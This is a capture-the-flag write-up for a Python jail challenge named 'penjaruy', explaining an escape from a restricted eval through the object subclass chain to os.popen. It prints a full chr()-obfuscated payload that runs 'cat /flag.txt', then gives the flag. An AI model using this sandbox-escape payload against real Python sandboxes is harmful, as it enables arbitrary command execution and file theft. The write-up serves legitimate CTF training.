# penjaruy
> Category: misc
> Difficulty: medium
> Author: 2byte

## Description
aku suka main penjara - penjaraan

## PoC
1. eval sandboxed, `eval(code, {"__builtins__": __builtins__})`, no modules in scope
2. `globals`, `locals`, `vars` blocked, can't access module namespace directly
3. MRO chain `().__class__.__mro__[1].__subclasses__()` to find `_wrap_close`
4. `_wrap_close.__init__.__globals__` to access `os.popen`
5. `chr()` to bypass all blocked keywords
6. final payload:
```python
getattr(getattr(getattr([x for x in ().__class__.__mro__[1].__subclasses__() if chr(95)+chr(119)+chr(114)+chr(97)+chr(112)+chr(95)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101) in x.__name__][0],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))()
```

## Flag
```
PorosCTF{jujur_biar_category_miscnya_kepake}
```

## Hints
1. kalo ada
2. kalo ada
3. kalo ada# misc-penjaruyV1
